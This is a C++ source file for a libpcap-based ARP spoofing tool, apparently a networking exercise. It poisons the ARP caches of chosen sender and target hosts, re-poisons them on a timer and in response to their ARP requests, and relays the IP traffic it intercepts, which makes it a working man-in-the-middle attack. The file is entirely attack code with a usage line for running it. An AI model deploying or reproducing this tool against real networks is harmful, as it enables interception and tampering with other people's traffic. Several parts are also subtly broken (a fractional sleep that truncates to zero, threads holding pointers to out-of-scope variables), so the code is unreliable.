#include <cstdio>
#include <errno.h>
#include <pcap.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <string.h>
#include <string>
#include <unistd.h>
#include <stdint.h>
#include <iostream>
#include <fstream>
#include <stdio.h>
#include <thread>
#include <vector>
#include <mutex>
#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
struct EthIpPacket final {
    EthHdr eth_;
    IpHdr ip_;
};
#pragma pack(pop)

mutex mtx;

void usage()
{
    cout << "syntax: ./arp-spoof <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n";
    cout << "sample: ./arp-spoof ens33 192.168.200.200 192.168.200.254\n";
}

void IsSendError(int res, pcap_t *handle)
{
    if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
}

void get_my_info(const char *interface, Mac* my_mac, Ip* my_ip)
{
    int sockfd;
    struct ifreq ifr;
    sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    if(sockfd < 0)
    {
        perror("[get_my_mac] socket: ");
        exit(0);
    }
    strcpy(ifr.ifr_name, interface);
    if(ioctl(sockfd, SIOCGIFHWADDR, &ifr) < 0)
    {
        perror("[get_my_info] mac-ioctl: ");
        close(sockfd);
        exit(-1);
    }
    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, Mac::SIZE);
    if (ioctl(sockfd, SIOCGIFADDR, &ifr) < 0)
    {
        perror("[get_my_info] ip-ioctl: ");
        close(sockfd);
        exit(-1);
    }
    *my_ip = Ip(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr));
    close(sockfd);
}

void packet_set(EthArpPacket* packet, string eth_dmac, string eth_smac, string eth_op, string arp_smac, string arp_sip, string arp_tmac, string arp_tip)
{
	packet->eth_.dmac_ = Mac(eth_dmac);		     
	packet->eth_.smac_ = Mac(eth_smac);		     
	packet->eth_.type_ = htons(EthHdr::Arp);

	packet->arp_.hrd_ = htons(ArpHdr::ETHER);
	packet->arp_.pro_ = htons(EthHdr::Ip4);
	packet->arp_.hln_ = Mac::SIZE;
	packet->arp_.pln_ = Ip::SIZE;
    if(!eth_op.compare("Request")){
	    packet->arp_.op_ = htons(ArpHdr::Request);
    }    
    else if(!eth_op.compare("Reply")){
        packet->arp_.op_ = htons(ArpHdr::Reply);
    }	    
    else{
        cout << "Invalid eth_op!!" << endl;
        return;
    }
	packet->arp_.smac_ = Mac(arp_smac);		  
	packet->arp_.sip_ = htonl(Ip(arp_sip));	      
	packet->arp_.tmac_ = Mac(arp_tmac);		        
	packet->arp_.tip_ = htonl(Ip(arp_tip));	       

    return;
}

string extract_mac(const u_char *p)
{
    EthArpPacket *packet = (EthArpPacket *) p;

    if(packet->eth_.type() != EthHdr::Arp)
        return "";
    if(packet->arp_.op_ != htons(ArpHdr::Reply))
        return "";

    return (string)(packet->eth_.smac_);
}

string get_mac(pcap_t* handle, Mac* my_mac, Ip* my_ip, Ip* sender_ip)
{
    //  Packet Send
	EthArpPacket packet;
    packet_set(&packet, "FF:FF:FF:FF:FF:FF", (string)*my_mac, "Request", (string)*my_mac, (string)*my_ip, "00:00:00:00:00:00", (string)*sender_ip);

    mtx.lock();

	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	IsSendError(res, handle);

    // Packet receive
    while (true) {
		struct pcap_pkthdr* header;
		const u_char* p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			mtx.unlock();
            break;
		}
		string you_mac = extract_mac(p);
        if(you_mac.empty())
            continue;
        
        mtx.unlock();
        return you_mac;
	}

    return 0;
}

void infection_repeat(pcap_t* handle, Mac* my_mac, Ip* my_ip, Mac* sender_mac, Ip* sender_ip, Mac* target_mac, Ip* target_ip)
{
    while(true)
    {
        sleep(20);
        
        EthArpPacket packet;
        packet_set(&packet, (string)*sender_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*target_ip, (string)*sender_mac, (string)*sender_ip);
        int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	    IsSendError(res, handle);

        packet_set(&packet, (string)*target_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*sender_ip, (string)*target_mac, (string)*target_ip);
        res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	    IsSendError(res, handle);
    }
}


bool infection(pcap_t* handle, Mac* my_mac, Ip* my_ip, Mac* sender_mac, Ip* sender_ip, Mac* target_mac, Ip* target_ip)
{
    //  Packet Send
	EthArpPacket packet;
    packet_set(&packet, (string)*sender_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*target_ip, (string)*sender_mac, (string)*sender_ip);
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	IsSendError(res, handle);

    packet_set(&packet, (string)*target_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*sender_ip, (string)*target_mac, (string)*target_ip);
    res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	IsSendError(res, handle);

    while (true) {
		struct pcap_pkthdr* header;
		const u_char* p;
		int res = pcap_next_ex(handle, &header, &p);
		if (res == 0) continue;
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            break;
		}
		
        EthHdr *Eth = (EthHdr *)p;
        if(Eth->type() == EthHdr::Arp){
            EthArpPacket* EthArp = (EthArpPacket *)p;
            if(EthArp->arp_.op() != ArpHdr::Request)
                continue;

            if(EthArp->eth_.smac() == *sender_mac && EthArp->arp_.tip() == *target_ip){
                if(EthArp->eth_.dmac() == Mac("ff:ff:ff:ff:ff:ff")){
                    sleep(0.2);
                }
                packet_set(EthArp, (string)*sender_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*target_ip, (string)*sender_mac, (string)*sender_ip);
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(EthArp), sizeof(EthArpPacket));
	            IsSendError(res, handle);
            }
            else if(EthArp->eth_.smac() == *target_mac && EthArp->arp_.tip() == *sender_ip){
                if(EthArp->eth_.dmac() == Mac("ff:ff:ff:ff:ff:ff")){
                    sleep(0.2);
                }
                packet_set(EthArp, (string)*target_mac, (string)*my_mac, "Reply", (string)*my_mac, (string)*sender_ip, (string)*target_mac, (string)*target_ip);
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(EthArp), sizeof(EthArpPacket));
	            IsSendError(res, handle);
            }
        }
        else if(Eth->type() == EthHdr::Ip4){
            EthIpPacket* EthIp = (EthIpPacket *)p;

            if((string)(Eth->dmac_) == "FF:FF:FF:FF:FF:FF"){
                continue;
            }
            else if(EthIp->eth_.smac() == *sender_mac){
                EthIp->eth_.smac_ = Mac((string)*my_mac);
                EthIp->eth_.dmac_ = Mac((string)*target_mac);

                u_char Send[header->len];
                memcpy(Send, p, header->len);
                memcpy(Send, EthIp, sizeof(EthIpPacket));
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Send), header->len);
                IsSendError(res, handle);
            }
            else if(EthIp->eth_.smac() == *target_mac && EthIp->ip_.tip() == *sender_ip){
                EthIp->eth_.smac_ = Mac((string)*my_mac);
                EthIp->eth_.dmac_ = Mac((string)*sender_mac);

                u_char Send[header->len];
                memcpy(Send, p, header->len);
                memcpy(Send, EthIp, sizeof(EthIpPacket));
                res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&Send), header->len);
	            IsSendError(res, handle);
            }
            else{
                continue;
            }
        }
        else{
            continue;
        }
    }

    return true;
}

int main(int argc, char *argv[])
{
    if(argc<3 || argc%2)
    {
        usage();
        return 0;
    }

    const char* interface = argv[1];
    Mac my_mac;
    Ip my_ip;
    get_my_info(interface, &my_mac, &my_ip);

    // Get mac and Infection
    char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(interface, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", interface, errbuf);
		exit(0);
	}

    vector<thread> v1;
    vector<thread> v2;
    for(int i=2; i<argc; i+=2)
    {
        Ip sender_ip = Ip(argv[i]);
        Ip target_ip = Ip(argv[i+1]);
 
        // Get sender, target mac
        Mac sender_mac = Mac(get_mac(handle, &my_mac, &my_ip, &sender_ip));
        Mac target_mac = Mac(get_mac(handle, &my_mac, &my_ip, &target_ip));

        // Attack
        v1.push_back(thread(infection, handle, &my_mac, &my_ip, &sender_mac, &sender_ip, &target_mac, &target_ip));
        v2.push_back(thread(infection_repeat, handle, &my_mac, &my_ip, &sender_mac, &sender_ip, &target_mac, &target_ip));
    }

    cout << v1.size() << " threads are running" << endl;

    for(int i=0; i<v1.size(); i++)
    {
        v1[i].join();
    }

    return 0;
}